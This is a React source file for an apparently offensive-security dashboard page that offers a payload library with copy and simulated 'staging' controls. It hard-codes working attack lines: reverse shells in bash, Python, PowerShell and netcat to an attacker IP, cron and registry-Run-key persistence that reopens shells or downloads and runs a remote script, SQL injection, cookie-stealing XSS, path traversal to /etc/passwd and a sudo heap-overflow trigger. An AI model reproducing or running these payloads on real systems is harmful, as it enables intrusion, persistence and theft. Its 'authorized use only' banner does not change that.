"use client";

import { useState } from "react";
import {
  Zap,
  Code,
  Play,
  Copy,
  CheckCircle,
  ChevronDown,
  ChevronUp,
  Terminal,
  Shield,
  AlertTriangle,
  Target,
  Cpu,
  Globe,
  Lock,
  RefreshCw,
  Download,
  Upload,
  Eye,
  EyeOff,
} from "lucide-react";

const payloadCategories = [
  { id: "reverse", label: "Reverse Shells", icon: Terminal, color: "#ff3366" },
  { id: "web", label: "Web Exploits", icon: Globe, color: "#ff8c00" },
  { id: "privesc", label: "Privilege Escalation", icon: Shield, color: "#9b59ff" },
  { id: "persistence", label: "Persistence", icon: Lock, color: "#ffd700" },
  { id: "recon", label: "Reconnaissance", icon: Eye, color: "#00d4ff" },
  { id: "custom", label: "Custom", icon: Code, color: "#00ff88" },
];

const payloads: Record<string, Array<{
  id: string; name: string; desc: string; platform: string; encoded: boolean;
  code: string; tags: string[];
}>> = {
  reverse: [
    {
      id: "bash-tcp", name: "Bash TCP Reverse Shell", desc: "Classic bash reverse shell over TCP",
      platform: "Linux", encoded: false,
      code: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`,
      tags: ["bash", "linux", "tcp"],
    },
    {
      id: "python-rev", name: "Python3 Reverse Shell", desc: "Python3 reverse shell with socket",
      platform: "Cross-platform", encoded: false,
      code: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      tags: ["python", "cross-platform"],
    },
    {
      id: "powershell-rev", name: "PowerShell Reverse Shell", desc: "Encoded PowerShell reverse shell",
      platform: "Windows", encoded: true,
      code: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      tags: ["powershell", "windows", "encoded"],
    },
    {
      id: "nc-rev", name: "Netcat Reverse Shell", desc: "Simple netcat reverse shell",
      platform: "Linux", encoded: false,
      code: `nc -e /bin/sh ATTACKER_IP 4444`,
      tags: ["netcat", "linux"],
    },
  ],
  web: [
    {
      id: "sqli-union", name: "SQL Injection UNION", desc: "UNION-based SQL injection payload",
      platform: "Web", encoded: false,
      code: `' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--`,
      tags: ["sqli", "union", "mysql"],
    },
    {
      id: "xss-basic", name: "XSS Alert Probe", desc: "Basic XSS detection payload",
      platform: "Web", encoded: false,
      code: `<script>alert(document.cookie)</script>`,
      tags: ["xss", "javascript"],
    },
    {
      id: "lfi", name: "LFI Path Traversal", desc: "Local file inclusion traversal",
      platform: "Web", encoded: false,
      code: `../../../../etc/passwd%00`,
      tags: ["lfi", "traversal"],
    },
  ],
  privesc: [
    {
      id: "sudo-bypass", name: "Sudo Bypass (CVE-2021-3156)", desc: "Baron Samedit sudo heap overflow",
      platform: "Linux", encoded: false,
      code: `sudoedit -s '\\' $(python3 -c 'print("A"*65536)')`,
      tags: ["sudo", "cve-2021-3156", "linux"],
    },
    {
      id: "suid-find", name: "SUID Binary Finder", desc: "Find SUID binaries for privesc",
      platform: "Linux", encoded: false,
      code: `find / -perm -u=s -type f 2>/dev/null`,
      tags: ["suid", "linux", "recon"],
    },
  ],
  persistence: [
    {
      id: "cron-persist", name: "Cron Persistence", desc: "Add cron job for persistence",
      platform: "Linux", encoded: false,
      code: `(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -`,
      tags: ["cron", "linux", "persistence"],
    },
    {
      id: "reg-persist", name: "Registry Run Key", desc: "Windows registry persistence",
      platform: "Windows", encoded: false,
      code: `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"`,
      tags: ["registry", "windows", "persistence"],
    },
  ],
  recon: [
    {
      id: "enum-users", name: "User Enumeration", desc: "Enumerate system users",
      platform: "Linux", encoded: false,
      code: `cat /etc/passwd | cut -d: -f1`,
      tags: ["enum", "linux"],
    },
    {
      id: "net-recon", name: "Network Recon", desc: "Internal network discovery",
      platform: "Linux", encoded: false,
      code: `for i in $(seq 1 254); do (ping -c 1 192.168.1.$i | grep "bytes from" &); done`,
      tags: ["network", "ping", "linux"],
    },
  ],
  custom: [],
};

const deliveryMethods = [
  { id: "direct", label: "Direct Execution", icon: Play },
  { id: "http", label: "HTTP Server", icon: Globe },
  { id: "encoded", label: "Base64 Encoded", icon: Code },
  { id: "obfuscated", label: "Obfuscated", icon: EyeOff },
];

export default function PayloadsPage() {
  const [activeCategory, setActiveCategory] = useState("reverse");
  const [selectedPayload, setSelectedPayload] = useState<typeof payloads.reverse[0] | null>(null);
  const [attackerIP, setAttackerIP] = useState("10.0.0.1");
  const [attackerPort, setAttackerPort] = useState("4444");
  const [deliveryMethod, setDeliveryMethod] = useState("direct");
  const [copied, setCopied] = useState(false);
  const [showWarning, setShowWarning] = useState(true);
  const [customPayload, setCustomPayload] = useState("");
  const [isDelivering, setIsDelivering] = useState(false);
  const [deliveryLog, setDeliveryLog] = useState<string[]>([]);

  const currentPayloads = payloads[activeCategory] || [];

  const getProcessedCode = (code: string) => {
    return code
      .replace(/ATTACKER_IP/g, attackerIP)
      .replace(/ATTACKER_PORT/g, attackerPort);
  };

  const copyPayload = () => {
    if (!selectedPayload) return;
    navigator.clipboard.writeText(getProcessedCode(selectedPayload.code));
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const simulateDelivery = () => {
    if (!selectedPayload) return;
    setIsDelivering(true);
    setDeliveryLog([]);
    const logs = [
      `[*] Initializing payload delivery...`,
      `[*] Target: ${attackerIP}:${attackerPort}`,
      `[*] Payload: ${selectedPayload.name}`,
      `[*] Method: ${deliveryMethod}`,
      `[+] Establishing connection...`,
      `[+] Encoding payload...`,
      `[+] Injecting payload...`,
      `[!] Listener required on ${attackerIP}:${attackerPort}`,
      `[*] Run: nc -lvnp ${attackerPort}`,
      `[+] Payload staged successfully`,
    ];
    let i = 0;
    const interval = setInterval(() => {
      setDeliveryLog((prev) => [...prev, logs[i]]);
      i++;
      if (i >= logs.length) {
        clearInterval(interval);
        setIsDelivering(false);
      }
    }, 400);
  };

  return (
    <div className="p-4 md:p-6 space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h1 className="text-xl font-black text-[#e0f4ff] tracking-widest" style={{ fontFamily: "Orbitron, sans-serif" }}>
            PAYLOAD <span className="text-[#ff3366]">DELIVERY</span>
          </h1>
          <p className="text-[#3d6b7a] text-xs mt-0.5">Exploit Staging & Execution</p>
        </div>
      </div>

      {/* Warning Banner */}
      {showWarning && (
        <div className="cyber-card p-3 border-[rgba(255,140,0,0.4)] bg-[rgba(255,140,0,0.05)] flex items-start gap-3">
          <AlertTriangle className="w-4 h-4 text-[#ff8c00] flex-shrink-0 mt-0.5" />
          <div className="flex-1">
            <p className="text-xs text-[#ff8c00] font-semibold">Authorized Use Only</p>
            <p className="text-[10px] text-[#7ab8cc] mt-0.5">These tools are for authorized penetration testing only. Unauthorized use is illegal and unethical.</p>
          </div>
          <button onClick={() => setShowWarning(false)} className="text-[#3d6b7a] hover:text-[#7ab8cc] text-xs">✕</button>
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left: Categories + Payload List */}
        <div className="lg:col-span-1 space-y-4">
          {/* Categories */}
          <div className="cyber-card p-3">
            <div className="text-[10px] text-[#3d6b7a] uppercase tracking-widest mb-3">Categories</div>
            <div className="space-y-1">
              {payloadCategories.map((cat) => {
                const Icon = cat.icon;
                return (
                  <button
                    key={cat.id}
                    onClick={() => { setActiveCategory(cat.id); setSelectedPayload(null); }}
                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded border transition-all text-left ${
                      activeCategory === cat.id
                        ? "border-opacity-50 bg-opacity-10"
                        : "border-transparent hover:bg-[rgba(255,255,255,0.02)]"
                    }`}
                    style={activeCategory === cat.id ? { borderColor: cat.color, background: `${cat.color}15` } : {}}
                  >
                    <Icon className="w-4 h-4 flex-shrink-0" style={{ color: activeCategory === cat.id ? cat.color : "#3d6b7a" }} />
                    <span className="text-xs font-medium" style={{ color: activeCategory === cat.id ? cat.color : "#7ab8cc" }}>
                      {cat.label}
                    </span>
                    <span className="ml-auto text-[10px] text-[#3d6b7a]">
                      {(payloads[cat.id] || []).length}
                    </span>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Payload List */}
          <div className="cyber-card overflow-hidden">
            <div className="p-3 border-b border-[#1a3a4a]">
              <div className="text-[10px] text-[#3d6b7a] uppercase tracking-widest">
                {payloadCategories.find(c => c.id === activeCategory)?.label}
              </div>
            </div>
            <div className="divide-y divide-[#1a3a4a]">
              {currentPayloads.length === 0 ? (
                <div className="p-6 text-center">
                  <Code className="w-8 h-8 text-[#1a3a4a] mx-auto mb-2" />
                  <p className="text-xs text-[#3d6b7a]">No payloads. Add custom below.</p>
                </div>
              ) : (
                currentPayloads.map((payload) => (
                  <button
                    key={payload.id}
                    onClick={() => setSelectedPayload(payload)}
                    className={`w-full p-3 text-left transition-colors ${
                      selectedPayload?.id === payload.id
                        ? "bg-[rgba(255,51,102,0.08)]"
                        : "hover:bg-[rgba(255,255,255,0.02)]"
                    }`}
                  >
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-xs font-semibold text-[#e0f4ff]">{payload.name}</span>
                      {payload.encoded && <span className="cyber-badge badge-info text-[9px]">ENC</span>}
                    </div>
                    <div className="text-[10px] text-[#3d6b7a]">{payload.desc}</div>
                    <div className="flex items-center gap-1.5 mt-1.5">
                      <span className="cyber-badge badge-info text-[9px]">{payload.platform}</span>
                      {payload.tags.slice(0, 2).map(tag => (
                        <span key={tag} className="text-[9px] text-[#3d6b7a] border border-[#1a3a4a] px-1.5 py-0.5 rounded">{tag}</span>
                      ))}
                    </div>
                  </button>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Right: Payload Editor + Delivery */}
        <div className="lg:col-span-2 space-y-4">
          {/* Config */}
          <div className="cyber-card p-4">
            <div className="text-[10px] text-[#3d6b7a] uppercase tracking-widest mb-3">Configuration</div>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <div className="col-span-2">
                <label className="text-[10px] text-[#3d6b7a] block mb-1.5">Attacker IP / LHOST</label>
                <div className="flex items-center gap-2">
                  <Target className="w-3.5 h-3.5 text-[#ff3366] flex-shrink-0" />
                  <input
                    type="text"
                    value={attackerIP}
                    onChange={(e) => setAttackerIP(e.target.value)}
                    className="cyber-input"
                    placeholder="10.0.0.1"
                  />
                </div>
              </div>
              <div>
                <label className="text-[10px] text-[#3d6b7a] block mb-1.5">Port / LPORT</label>
                <input
                  type="text"
                  value={attackerPort}
                  onChange={(e) => setAttackerPort(e.target.value)}
                  className="cyber-input"
                  placeholder="4444"
                />
              </div>
              <div>
                <label className="text-[10px] text-[#3d6b7a] block mb-1.5">Delivery</label>
                <select
                  value={deliveryMethod}
                  onChange={(e) => setDeliveryMethod(e.target.value)}
                  className="cyber-input"
                >
                  {deliveryMethods.map(m => (
                    <option key={m.id} value={m.id}>{m.label}</option>
                  ))}
                </select>
              </div>
            </div>
          </div>

          {/* Payload Code */}
          <div className="cyber-card overflow-hidden">
            <div className="p-3 border-b border-[#1a3a4a] flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Code className="w-4 h-4 text-[#ff3366]" />
                <span className="text-xs font-semibold text-[#e0f4ff]">
                  {selectedPayload ? selectedPayload.name : "Select a payload"}
                </span>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={copyPayload}
                  disabled={!selectedPayload}
                  className="flex items-center gap-1.5 px-2 py-1 rounded border border-[#1a3a4a] text-[10px] text-[#7ab8cc] hover:border-[#00d4ff] hover:text-[#00d4ff] transition-colors disabled:opacity-40"
                >
                  {copied ? <CheckCircle className="w-3 h-3 text-[#00ff88]" /> : <Copy className="w-3 h-3" />}
                  {copied ? "Copied!" : "Copy"}
                </button>
                <button className="flex items-center gap-1.5 px-2 py-1 rounded border border-[#1a3a4a] text-[10px] text-[#7ab8cc] hover:border-[#00d4ff] hover:text-[#00d4ff] transition-colors">
                  <Download className="w-3 h-3" /> Export
                </button>
              </div>
            </div>
            <div className="terminal min-h-32 max-h-48 overflow-y-auto rounded-none border-0">
              {selectedPayload ? (
                <pre className="text-[#00ff88] text-xs whitespace-pre-wrap break-all leading-relaxed">
                  {getProcessedCode(selectedPayload.code)}
                </pre>
              ) : (
                <div className="text-[#3d6b7a] text-xs">
                  <span className="terminal-prompt">$ </span>
                  <span className="animate-blink">_</span>
                  <br />
                  <span className="text-[#1a3a4a]">{'// Select a payload from the list to view code'}</span>
                </div>
              )}
            </div>
          </div>

          {/* Custom Payload */}
          <div className="cyber-card p-4">
            <div className="text-[10px] text-[#3d6b7a] uppercase tracking-widest mb-3">Custom Payload</div>
            <textarea
              value={customPayload}
              onChange={(e) => setCustomPayload(e.target.value)}
              placeholder="// Enter custom payload code here..."
              className="cyber-input font-mono text-xs h-24 resize-none"
            />
          </div>

          {/* Delivery Controls */}
          <div className="cyber-card p-4">
            <div className="text-[10px] text-[#3d6b7a] uppercase tracking-widest mb-3">Delivery Controls</div>
            <div className="flex flex-wrap gap-3 mb-4">
              <button
                onClick={simulateDelivery}
                disabled={!selectedPayload || isDelivering}
                className={`flex items-center gap-2 px-4 py-2.5 rounded border font-semibold text-xs tracking-wider uppercase transition-all ${
                  !selectedPayload || isDelivering
                    ? "border-[#1a3a4a] text-[#3d6b7a] cursor-not-allowed"
                    : "border-[#ff3366] text-[#ff3366] bg-[rgba(255,51,102,0.1)] hover:bg-[rgba(255,51,102,0.2)]"
                }`}
              >
                {isDelivering ? <Cpu className="w-3.5 h-3.5 animate-rotate" /> : <Zap className="w-3.5 h-3.5" />}
                {isDelivering ? "Delivering..." : "Stage Payload"}
              </button>
              <button className="flex items-center gap-2 px-4 py-2.5 rounded border border-[#1a3a4a] text-[#7ab8cc] text-xs hover:border-[#00d4ff] hover:text-[#00d4ff] transition-colors">
                <Upload className="w-3.5 h-3.5" /> Import Payload
              </button>
              <button className="flex items-center gap-2 px-4 py-2.5 rounded border border-[#1a3a4a] text-[#7ab8cc] text-xs hover:border-[#9b59ff] hover:text-[#9b59ff] transition-colors">
                <RefreshCw className="w-3.5 h-3.5" /> Encode/Obfuscate
              </button>
            </div>

            {/* Delivery Log */}
            {deliveryLog.length > 0 && (
              <div className="terminal max-h-40 overflow-y-auto">
                {deliveryLog.map((line, i) => (
                  <div key={i} className={`terminal-line ${
                    line.startsWith("[+]") ? "terminal-success" :
                    line.startsWith("[!]") ? "terminal-warning" :
                    line.startsWith("[*]") ? "terminal-info" :
                    "terminal-output"
                  }`}>
                    {line}
                    {i === deliveryLog.length - 1 && isDelivering && <span className="animate-blink">_</span>}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
